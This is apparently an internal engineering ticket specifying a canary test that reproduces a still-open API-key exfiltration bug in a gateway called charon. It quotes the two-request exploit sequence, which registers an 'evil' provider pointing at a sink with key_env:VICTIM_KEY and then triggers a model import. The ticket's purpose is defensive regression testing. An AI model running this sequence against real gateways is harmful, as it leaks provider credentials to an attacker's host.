repo: charon-private
tier: strong
difficulty: 4
priority: 0
work_class: tests
branch: feat/egress-key-canary
owns: fleet/checks/egress-key-canary.sh, fleet/tests/egress-key-canary.test.sh
real-dep: PLANE-CANARY-REGISTRY seeds this plane's registry row at the exact
  fleet/checks/egress-key-canary.sh / fleet/tests/egress-key-canary.test.sh paths this ticket
  owns, and its reconciliation leg is what this canary must satisfy — a genuine build prereq.
depends_on: PLANE-CANARY-REGISTRY
source: fleet/state/DESIGN-PLANE-CANARY-SUITE.md Phase 3 "P7 security/egress-key (GAP, HIGHEST
  RISK)" spec + "PROPOSED TICKET LIST" row 4.
work_class_note: tests (ticket SHAPE = writing a canary/dogfood test); the SUBJECT matter is
  security-critical, which is why the mandatory adversarial-review clause below exists
  independent of the work_class tag.
note: |
  GAP plane, HIGHEST RISK (design doc Phase 3, #7). Reproduces the LIVE, still-open exfil from
  fleet/board/FIX-PROVIDER-KEY-EXFIL.md (PARKED, exfil confirmed not yet fixed): `POST
  /charon/providers {name:evil, base_url:http://127.0.0.1:<sink>/v1, key_env:VICTIM_KEY,
  key:sk-throwaway}` then `POST /charon/models/import {provider:evil}`. This canary is the
  ACCEPTANCE PROOF for that fix and the standing regression guard once it lands — it does NOT
  itself fix src/charon/secrets.py (FIX-PROVIDER-KEY-EXFIL owns that; disjoint owns, no
  depends_on needed since this canary is designed to be RED against today's unfixed code and
  flip GREEN the moment that fix lands — a canary correctly starting RED is the intended state,
  matching the reconciliation leg's "no silent gap" contract). May need the real gateway
  (Testcontainers, per Phase 1 tool-eval) since the vulnerability lives in src/charon; the
  stdlib fake used by flow-canary/failover-canary is NOT sufficient here because the exploit is
  IN the real header-forwarding code path, not a routing decision a fake can stand in for.
  [[security-is-a-ratchet-gate]] [[public-repo-no-personal-info]]
accept: |
  - fleet/checks/egress-key-canary.sh: stands up a LOCAL sink (stdlib http.server or
    Testcontainers-fronted real gateway, builder's call per the Phase 1 "may need Testcontainers"
    flag) that records the Authorization header it receives. Drives the two-request exfil
    sequence above against the real gateway (Testcontainers if the stdlib fake can't reach the
    vulnerable code path) and asserts the REAL VICTIM_KEY value NEVER arrives at the sink — only
    the throwaway key, or the request is refused (400/401), is an acceptable pass.
  - Fault seed = the current un-fixed `os.environ.setdefault` indirection
    (src/charon/secrets.py, per the design doc's file:line citation) -> key leaks to the sink ->
    canary RED. This is the CORRECT starting state on master today — do not "fix" secrets.py in
    this ticket (FIX-PROVIDER-KEY-EXFIL owns that fix); this ticket only proves the canary
    correctly detects the leak.
  - fail-on-revert test (fleet/tests/egress-key-canary.test.sh): (a) against the current unfixed
    code -> RED (the real key reaches the sink) — this IS the expected initial state, assert it
    explicitly so the canary's own detection is proven, not assumed; (b) against a fixture where
    the Option-B store-read fix (named in the design doc) is simulated/monkeypatched ->
    GREEN (key never leaves); (c) revert the simulated fix -> RED again, proving the assertion
    isn't a tautology that would pass regardless of key handling.
  - bash fleet/validate_board.sh GREEN (modulo pre-existing unrelated board state).
  - ADVERSARIAL REVIEW REQUIRED before merge (reviewer != builder) — security/key-exfiltration
    canary; a false-GREEN here would mean the standing regression guard for a live credential
    leak is itself broken. Manager gates; PR does NOT merge on the builder's self-report. Fix
    root cause, never step around a pre-existing red touched by this work.
scope: |
  The canary + its fault-seed proof only. Does NOT fix the exfil (FIX-PROVIDER-KEY-EXFIL, parked,
  disjoint owns, is the fix ticket this canary gates/guards). No new provider-key handling code
  is written here — only the reproduction harness + sink + assertions.
ds: |
  ## Dependencies & sequence
  depends_on PLANE-CANARY-REGISTRY only. Disjoint owns from FIX-PROVIDER-KEY-EXFIL (src/charon/*)
  and from every other gap-canary ticket in this wave — parallelizable. Intentionally starts RED
  against master; flips GREEN only once FIX-PROVIDER-KEY-EXFIL lands (not a build prereq of this
  ticket, a downstream consequence of it).
